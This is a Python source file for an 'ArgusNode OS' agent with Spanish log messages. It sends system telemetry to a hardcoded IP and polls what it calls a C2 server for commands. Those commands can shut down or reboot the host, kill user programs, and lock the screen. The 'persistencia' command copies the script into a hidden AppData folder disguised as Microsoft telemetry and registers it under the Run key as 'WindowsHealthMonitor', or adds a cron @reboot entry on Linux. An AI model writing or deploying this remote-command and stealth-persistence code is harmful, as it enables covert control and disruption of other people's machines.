import time
import platform
import psutil
import requests
import json
import logging
import socket
import os
import sys
import subprocess

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- AGENT CONFIGURATION ---
# TODO: Move to config.ini or environment variables in production
BACKEND_URL = "http://100.115.255.119:8000/api/telemetry"
COMMAND_URL = "http://100.115.255.119:8000/api/commands"
POLL_INTERVAL = 5 # Polling interval in seconds

# Global variables for bandwidth calculation
last_net_io = psutil.net_io_counters()
last_net_time = time.time()

def get_system_metrics():
    """Collects system vitals using psutil"""
    global last_net_io, last_net_time
    try:
        # 1. CPU y RAM
        cpu_usage = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        
        # 2. Dirección IP
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        
        # 3. Temperatura
        temperature = "N/A"
        if hasattr(psutil, "sensors_temperatures"):
            temps = psutil.sensors_temperatures()
            if temps:
                if 'coretemp' in temps:
                    temperature = str(round(temps['coretemp'][0].current, 1)) + "°C"
                else:
                    first_sensor = list(temps.values())[0]
                    if first_sensor:
                        temperature = str(round(first_sensor[0].current, 1)) + "°C"

        # 4. Ancho de banda de Red (MB/s)
        current_net_io = psutil.net_io_counters()
        current_time = time.time()
        
        time_delta = current_time - last_net_time
        bytes_sent = current_net_io.bytes_sent - last_net_io.bytes_sent
        bytes_recv = current_net_io.bytes_recv - last_net_io.bytes_recv
        
        net_upload_mbps = round((bytes_sent / time_delta) / (1024 * 1024), 2)
        net_download_mbps = round((bytes_recv / time_delta) / (1024 * 1024), 2)
        
        # Update variables for the next cycle
        last_net_io = current_net_io
        last_net_time = current_time

        # 5. Top 5 Procesos por CPU
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.info
                if info['cpu_percent'] is not None:
                    # Round memory usage
                    if info['memory_percent'] is not None:
                        info['memory_percent'] = round(info['memory_percent'], 1)
                    processes.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
                
        # Sort by CPU usage and take top 5
        processes = sorted(processes, key=lambda p: p['cpu_percent'], reverse=True)[:5]
        
        return {
            "node_id": platform.node(),
            "os_type": platform.system(),
            "ip_address": ip_addr,
            "cpu_usage": cpu_usage,
            "ram_usage": ram.percent,
            "temperature": temperature,
            "net_upload_mbps": net_upload_mbps,
            "net_download_mbps": net_download_mbps,
            "top_processes": processes,
            "metrics": {
                "ram_total_gb": round(ram.total / (1024**3), 2),
                "ram_used_gb": round(ram.used / (1024**3), 2)
            }
        }
    except Exception as e:
        logging.error(f"Error al recolectar métricas: {e}")
        return None

def send_telemetry(payload):
    """Sends JSON payload to the Control Plane via HTTP POST"""
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(BACKEND_URL, data=json.dumps(payload), headers=headers, timeout=3)
        if response.status_code == 200:
            logging.info(f"[EXITO] Telemetría enviada -> CPU: {payload['cpu_usage']}% | RAM: {payload['ram_usage']}% | IP: {payload['ip_address']} | Subida: {payload['net_upload_mbps']}MB/s")
        else:
            logging.warning(f"[FALLO HTTP] Servidor devolvió código {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERROR RED] No se pudo conectar a {BACKEND_URL}. ¿Está la VPN activa?")

def execute_command(cmd):
    """Executes native OS commands dictated by the C2"""
    is_windows = platform.system() == "Windows"
    try:
        if cmd == "apagar":
            os.system("shutdown /s /t 0") if is_windows else os.system("sudo shutdown -h now")
        elif cmd == "reiniciar":
            os.system("shutdown /r /t 0") if is_windows else os.system("sudo shutdown -r now")
        elif cmd == "matar_programas":
            if is_windows:
                # Kill common user applications (PoC)
                os.system('taskkill /F /IM chrome.exe /IM msedge.exe /IM notepad.exe /IM calculator.exe /T')
                logging.info("Órden de matar programas ejecutada.")
            else:
                os.system("pkill -u $USER")
        elif cmd == "bloquear_pantalla":
            if is_windows:
                os.system("rundll32.exe user32.dll,LockWorkStation")
            else:
                os.system("loginctl lock-session")
        elif cmd == "purgar_dns":
            os.system("ipconfig /flushdns") if is_windows else os.system("sudo systemd-resolve --flush-caches")
        elif cmd == "persistencia":
            if is_windows:
                import winreg
                import shutil
                try:
                    # 1. Copy to a hidden location in AppData
                    target_dir = os.path.join(os.environ.get("LOCALAPPDATA", "C:\\"), "Microsoft_Telemetry_Diag")
                    os.makedirs(target_dir, exist_ok=True)
                    target_path = os.path.join(target_dir, "sys_core.py")
                    
                    current_path = os.path.abspath(sys.argv[0])
                    if current_path != target_path:
                        shutil.copy2(current_path, target_path)
                        logging.warning(f"👻 [STEALTH] Agente movido y ocultado en: {target_path}")
                    
                    # 2. Inject the hidden path into the Registry with a disguised name
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    agent_path = f'"{sys.executable}" "{target_path}"'
                    winreg.SetValueEx(key, "WindowsHealthMonitor", 0, winreg.REG_SZ, agent_path)
                    winreg.CloseKey(key)
                    logging.warning("🕷️ [PERSISTENCIA] Inyectado con éxito en el Registro de Windows (HKCU\\...\\Run)")
                except Exception as e:
                    logging.error(f"Fallo al inyectar persistencia en registro: {e}")
            else:
                try:
                    # Use cron (@reboot) for Linux persistence
                    agent_path = f'{sys.executable} {os.path.abspath(sys.argv[0])}'
                    cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {agent_path}") | crontab -'
                    os.system(cron_cmd)
                    logging.warning("🕷️ [PERSISTENCIA] Inyectado con éxito en Crontab (@reboot)")
                except Exception as e:
                    logging.error(f"Fallo al inyectar persistencia en crontab: {e}")
        else:
            logging.warning(f"Orden desconocida: {cmd}")
    except Exception as e:
        logging.error(f"Fallo al ejecutar orden {cmd}: {e}")

def check_for_commands(node_id):
    """Polls the C2 for pending commands and executes them."""
    try:
        response = requests.get(f"{COMMAND_URL}/{node_id}/pending", timeout=3)
        if response.status_code == 200:
            data = response.json()
            commands = data.get("commands", [])
            for cmd in commands:
                logging.warning(f"⚠️ [ORDEN C2 RECIBIDA]: Ejecutando '{cmd}'...")
                execute_command(cmd)
    except Exception as e:
        pass # Silently ignore network errors during polling

def main():
    logging.info("=========================================")
    logging.info("  ArgusNode OS - Agente Extendido Iniciado")
    logging.info(f"  Modo: Espía Forense (Destino: {BACKEND_URL})")
    logging.info("=========================================")
    
    # Initial quick call to initialize psutil counters properly
    psutil.cpu_percent(interval=0.1)
    
    while True:
        payload = get_system_metrics()
        if payload:
            send_telemetry(payload)
            check_for_commands(payload["node_id"])
        
        # Sleep until next cycle
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
